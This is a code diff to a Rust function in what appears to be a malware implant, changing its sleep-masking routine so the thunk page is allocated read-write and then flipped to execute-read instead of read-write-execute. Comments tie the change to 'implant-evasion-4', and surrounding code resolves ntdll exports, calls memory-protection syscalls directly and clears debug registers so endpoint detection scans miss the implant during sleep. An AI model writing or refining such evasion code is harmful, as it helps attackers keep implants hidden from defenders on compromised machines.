@@ -102,7 +102,9 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     let alloc: NtAlloc = core::mem::transmute(nt_alloc_va);
     let mut page: *mut c_void = core::ptr::null_mut();
     let mut sz: usize = 0x1000;
-    let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40);
+    // PAGE_READWRITE (0x04), NOT PAGE_EXECUTE_READWRITE — the page must never
+    // be both writable and executable at the same time (implant-evasion-4).
+    let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x04);
     if st < 0 || page.is_null() {
         return false;
     }
@@ -121,6 +123,34 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
         crate::mem::unmask as *const () as usize,
     );
     core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
+
+    // W^X: the thunk page is RW only while we write it, then flipped to
+    // PAGE_EXECUTE_READ (0x20) before executing — never RWX (implant-evasion-4).
+    // A page that cannot be made executable is never run: free it and degrade
+    // to a plain (unmasked) sleep cycle.
+    let mut prot_base = page as usize;
+    let mut prot_sz: usize = 0x1000;
+    let mut old_prot: u32 = 0;
+    let flip_ok = crate::syscalls::nt_protect_virtual_memory(
+        rt,
+        &mut prot_base,
+        &mut prot_sz,
+        0x20, // PAGE_EXECUTE_READ
+        &mut old_prot,
+    )
+    .map(|st| st >= 0)
+    .unwrap_or(false);
+    if !flip_ok {
+        let nt_free_va = match resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
+            Some(a) => a,
+            None => return false,
+        };
+        type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
+        let free: NtFree = core::mem::transmute(nt_free_va);
+        let mut fsz: usize = 0;
+        free(!0usize, &mut page, &mut fsz, 0x8000);
+        return false;
+    }
 
     // ---- Countermeasure: DR sanitization during sleep ----
     // Save DR0-DR7, clear them so EDR async thread scans during
